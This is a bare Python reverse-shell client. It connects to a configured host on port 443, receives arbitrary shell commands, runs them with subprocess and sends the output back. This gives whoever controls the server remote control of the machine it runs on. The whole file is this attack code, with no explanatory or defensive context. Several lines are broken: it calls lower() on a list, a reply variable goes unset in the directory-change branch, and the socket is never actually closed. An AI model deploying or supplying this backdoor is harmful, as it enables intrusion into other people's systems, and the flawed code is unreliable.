import socket,subprocess,os,sys
server_host="127.0.0.1"
server_port=443
BUFFER_SIZE=1024*1000
separator="<sep>"

s=socket.socket()
s.connect((server_host,server_port))
cwd=os.getcwd()
s.send(cwd.encode())

while True:
    command=s.recv(BUFFER_SIZE).decode()
    splitted_command=command.split()

    if command.lower()=="exit":
        break
    if splitted_command.lower()=="cd":
        try:
            os.chdir(" ".join(splitted_command[1:]))
        except Exception as e:
            output=str(e)
        else:
            output=""

    else:
        output=subprocess.getoutput(command)
        message=f"{output}{separator}{cwd}"

    s.send(message.encode())
s.close
